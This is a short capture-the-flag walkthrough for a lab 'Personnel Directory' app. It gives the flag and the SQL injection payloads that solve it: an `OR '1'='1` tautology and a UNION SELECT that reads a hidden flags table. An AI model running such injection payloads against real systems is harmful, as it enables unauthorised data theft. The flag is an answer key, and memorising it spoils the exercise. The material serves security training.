# Scenario 10 — Personnel Directory UNION SQLi

- **Port:** `8010`
- **Category:** SQL Injection
- **Difficulty:** Medium / Hard
- **Flag:** `CTF{un10n_s3l3ct_m4st3r}`

## Walkthrough
1. Confirm injectability: `http://<host>:8010/directory?q=test' OR '1'='1` returns all employees.
2. Confirm column count (3 columns: name, department, email).
3. Extract flag from hidden `flags` table:
   `http://<host>:8010/directory?q=nonexistent' UNION SELECT label, 'flags-table', value FROM flags -- -`
4. Result displays `CTF{un10n_s3l3ct_m4st3r}`.
